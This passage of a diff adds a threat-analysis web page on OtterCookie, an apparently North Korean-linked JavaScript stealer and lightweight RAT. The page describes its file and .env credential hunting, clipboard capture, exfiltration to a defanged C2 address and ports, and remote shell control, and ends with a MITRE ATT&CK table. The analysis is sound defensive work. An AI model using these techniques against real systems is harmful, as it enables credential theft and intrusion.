+  <img src="../images/Pasted image 20260120105439.png" alt="Exhibit 7: File Patterns OtterCookie Recon Logic" />
+  <figcaption>Exhibit 7: File Patterns OtterCookie Recon Logic</figcaption>
+</figure>
+
+<p>OtterCookie performs deep recursive traversal of user-accessible directories,
+prioritising locations commonly used by developers — Desktop, Documents, Downloads,
+and project folders. On Windows systems, it expands its scope to all available drives.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105447.png" alt="Exhibit 8: Locations Prioritisation OtterCookie Logic" />
+  <figcaption>Exhibit 8: Locations Prioritisation OtterCookie Logic</figcaption>
+</figure>
+
+<p>Each discovered file is evaluated for readability, size threshold, and sensitivity
+criteria before exfiltration — minimising failed uploads and avoiding large files
+that could draw attention.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105453.png" alt="Exhibit 9: MAX_FILE_SIZE_BYTES OtterCookie Criteria Logic" />
+  <figcaption>Exhibit 9: MAX_FILE_SIZE_BYTES OtterCookie Criteria Logic</figcaption>
+</figure>
+
+<p>Qualifying files are exfiltrated using authenticated HTTP uploads. Requests include
+host identifiers and the original file path, allowing the attacker to reconstruct
+directory context server-side.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105500.png" alt="Exhibit 10: OtterCookie Exfiltration Logic" />
+  <figcaption>Exhibit 10: OtterCookie Exfiltration Logic to hxxp://144.172.116[.]80:8086/upload</figcaption>
+</figure>
+
+<p>Separate network channels handle different functions: port 8085 for structured file
+uploads via <code>/api/upload-file</code>, and port 8087 as the primary C2 endpoint for
+telemetry, WebSocket command execution, and clipboard data exfiltration.</p>
+<figure>
+  <img src="../images/Pasted image 20260120113820.png" alt="Exhibit 11: Ports in Use for Different Functions" />
+  <figcaption>Exhibit 11: Ports in Use for Different Functions</figcaption>
+</figure>
+
+<p>Beyond opportunistic scanning, OtterCookie implements explicit targeted searches for
+<code>.env</code> files — which frequently contain API keys, database credentials, and cloud
+secrets — using platform-native tooling across entire systems.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105526.png" alt="Exhibit 12: .env OtterCookie Recon Logic" />
+  <figcaption>Exhibit 12: .env OtterCookie Recon Logic</figcaption>
+</figure>
+
+<p>Beyond disk-resident files, the malware continuously harvests transient secrets
+through clipboard monitoring — capturing credentials, tokens, and wallet addresses
+that may never be written to disk.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105532.png" alt="Exhibit 13: OtterCookie Clipboard Monitoring Logic" />
+  <figcaption>Exhibit 13: OtterCookie Clipboard Monitoring Logic</figcaption>
+</figure>
+
+<p>Clipboard access uses platform-specific mechanisms including PowerShell on Windows,
+ensuring reliable access across development environments.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105542.png" alt="Exhibit 14: getClipboardContent Function" />
+  <figcaption>Exhibit 14: getClipboardContent Function for Clipboard Access</figcaption>
+</figure>
+
+<p>All exfiltrated data — whether file-based or clipboard-derived — is transmitted to
+attacker-controlled endpoints, with host identification tightly coupled to stolen
+content.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105548.png" alt="Exhibit 15: OtterCookie C2 Capabilities" />
+  <figcaption>Exhibit 15: OtterCookie C2 Capabilities</figcaption>
+</figure>
+
+<figure>
+  <img src="../images/Pasted image 20260120105555.png" alt="Exhibit 16: OtterCookie C2 Server" />
+  <figcaption>Exhibit 16: OtterCookie C2 Server</figcaption>
+</figure>
+
+<h3 id="lightweight-rat-capabilities">Lightweight RAT Capabilities<a class="headerlink" href="#lightweight-rat-capabilities" title="Permanent link">&para;</a></h3>
+<p>Beyond data theft, OtterCookie provides interactive remote control — effectively
+functioning as a lightweight RAT. The malware establishes a persistent WebSocket
+connection to the C2 server, enabling operators to execute arbitrary shell commands
+and browse directories using native filesystem APIs to preserve Unicode correctness.</p>
+<figure>
+  <img src="../images/Pasted image 20260120105606.png" alt="Exhibit 17: WebSocket Connection Capability" />
+  <figcaption>Exhibit 17: WebSocket Connection Capability</figcaption>
+</figure>
+
+<figure>
+  <img src="../images/Pasted image 20260120105610.png" alt="Exhibit 18: Arbitrary Shell Commands Capability" />
+  <figcaption>Exhibit 18: Arbitrary Shell Commands Capability</figcaption>
+</figure>
+
+<h2 id="mitre-attck-mapping">MITRE ATT&amp;CK Mapping<a class="headerlink" href="#mitre-attck-mapping" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Tactic</th>
+<th>Technique</th>
+<th>ID</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Initial Access</td>
+<td>Supply Chain Compromise: Compromise Software Supply Chain</td>
+<td>T1195.002</td>
+</tr>
+<tr>
+<td>Execution</td>
+<td>Command and Scripting Interpreter: JavaScript</td>
+<td>T1059.007</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>Obfuscated Files or Information: JavaScript Obfuscation</td>
+<td>T1027.009</td>
+</tr>
+<tr>
+<td>Defense Evasion</td>
+<td>Indicator Removal: File Deletion</td>
+<td>T1070.004</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Unsecured Credentials: Credentials In Files</td>
+<td>T1552.001</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Credentials from Password Stores: Credentials from Web Browsers</td>
+<td>T1555.003</td>
+</tr>
+<tr>
+<td>Credential Access</td>
+<td>Steal Web Session Cookie</td>
+<td>T1539</td>
+</tr>
+<tr>
+<td>Discovery</td>
+<td>File and Directory Discovery</td>
+<td>T1083</td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>Data from Local System</td>
+<td>T1005</td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>Clipboard Data</td>
+<td>T1115</td>
+</tr>
+<tr>
+<td>Collection</td>
+<td>Automated Collection</td>
+<td>T1119</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>Application Layer Protocol: Web Protocols</td>
+<td>T1071.001</td>
+</tr>
+<tr>
+<td>Command and Control</td>
+<td>Web Service: Dead Drop Resolver</td>
+<td>T1102.001</td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>Exfiltration Over C2 Channel</td>
+<td>T1041</td>
+</tr>
+<tr>
+<td>Exfiltration</td>
+<td>Automated Exfiltration</td>
+<td>T1020</td>
+</tr>
+</tbody>
+</table>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p>MITRE ATT&amp;CK — <a href="https://attack.mitre.org/groups/G1052/">Group G1052: Contagious Interview</a>&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:2">
+<p>The Hacker News — <a href="https://thehackernews.com/2025/10/north-korean-hackers-combine-beavertail.html">North Korean Hackers Combine BeaverTail and OtterCookie into Advanced JS Malware</a> (October 2025)&#160;<a class="footnote-backref" href="#fnref:2" title="Jump back to footnote 2 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:2" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+<li id="fn:3">
+<p>NVISO Labs via The Hacker News — <a href="https://thehackernews.com/2025/11/north-korean-hackers-turn-json-services.html">North Korean Hackers Turn JSON Services into Covert Malware Delivery Channels</a> (November 2025)&#160;<a class="footnote-backref" href="#fnref:3" title="Jump back to footnote 3 in the text">&#8617;</a><a class="footnote-backref" href="#fnref2:3" title="Jump back to footnote 3 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+  
+
+
+
+      
+    </article>
+  </div>
+
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+        
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../unc5342-npm-malware-uses-custom-headers-to-gate-malicious-payload/" class="md-footer__link md-footer__link--prev" aria-label="Previous: UNC5342 NPM Malware Uses Custom Headers to Gate Malicious Payload">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                UNC5342 NPM Malware Uses Custom Headers to Gate Malicious Payload
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../muddywater-word-macros-ghostfetch/" class="md-footer__link md-footer__link--next" aria-label="Next: MuddyWater Weaponizes Word Macros in Targeted Campaign Delivering GhostFetch">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                MuddyWater Weaponizes Word Macros in Targeted Campaign Delivering GhostFetch
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+        
+<div class="md-social">
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://github.com/V0lundr" target="_blank" rel="noopener" title="github.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M173.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6m-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3m44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9M252.8 8C114.1 8 8 113.3 8 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C436.2 457.8 504 362.9 504 252 504 113.3 391.5 8 252.8 8M105.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg>
+    </a>
+  
+    
+    
+    
+    
+      
+      
+    
+    <a href="https://twitter.com/" target="_blank" rel="noopener" title="twitter.com" class="md-social__link">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><!--! Font Awesome Free 7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2025 Fonticons, Inc.--><path d="M459.4 151.7c.3 4.5.3 9.1.3 13.6 0 138.7-105.6 298.6-298.6 298.6-59.5 0-114.7-17.2-161.1-47.1 8.4 1 16.6 1.3 25.3 1.3 49.1 0 94.2-16.6 130.3-44.8-46.1-1-84.8-31.2-98.1-72.8 6.5 1 13 1.6 19.8 1.6 9.4 0 18.8-1.3 27.6-3.6-48.1-9.7-84.1-52-84.1-103v-1.3c14 7.8 30.2 12.7 47.4 13.3-28.3-18.8-46.8-51-46.8-87.4 0-19.5 5.2-37.4 14.3-53C87.4 130.8 165 172.4 252.1 176.9c-1.6-7.8-2.6-15.9-2.6-24C249.5 95.1 296.3 48 354.4 48c30.2 0 57.5 12.7 76.7 33.1 23.7-4.5 46.5-13.3 66.6-25.3-7.8 24.4-24.4 44.8-46.1 57.8 21.1-2.3 41.6-8.1 60.4-16.2-14.3 20.8-32.2 39.3-52.6 54.3"/></svg>
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.tabs", "navigation.top", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "content.code.annotate", "content.tooltips"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/fix.js"></script>
+      
+    
+  </body>
+</html>
